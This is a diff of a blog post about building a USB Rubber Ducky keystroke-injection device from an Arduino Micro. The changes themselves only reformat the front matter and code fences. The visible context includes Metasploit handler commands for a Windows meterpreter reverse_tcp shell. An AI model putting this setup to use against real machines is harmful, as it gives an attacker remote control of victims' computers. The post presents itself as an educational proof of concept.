@@ -1,8 +1,7 @@
-+++
-title = "USB Rubber Ducky with Arduino Micro"
-date = 2019-03-17T19:28:52+03:00
-categories = ["GNULinux"]
-+++
+---
+title: "USB Rubber Ducky with Arduino Micro"
+date: 17 March 2019
+---
 
 ***DISCLAIMER:*** *This is merely a proof of concept for education purposes. Use it only against your own networks and devices!*
 
@@ -43,7 +42,7 @@ The command is to be written on the Windows Command Prompt, so we will also have
 
 Below is the Arduino sketch that I have come up with:
 
-```Arduino
+```Cpp
 /*
  *    USB Rubber Ducky with Arduino Micro
  *    
@@ -101,6 +100,7 @@ void cmdOpen() {
 ## msfconsole
 
 Now that the payload is ready to be "typed", we have to be listening to it. In `msfconsole`, type:
+
 ```ruby
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
@@ -114,3 +114,5 @@ Now that we are listening, you can finally insert your Arduino/Rubber Ducky to t
 # Downloads
 
 [rubber.ino](files/rubber.ino)
+
+$\space$
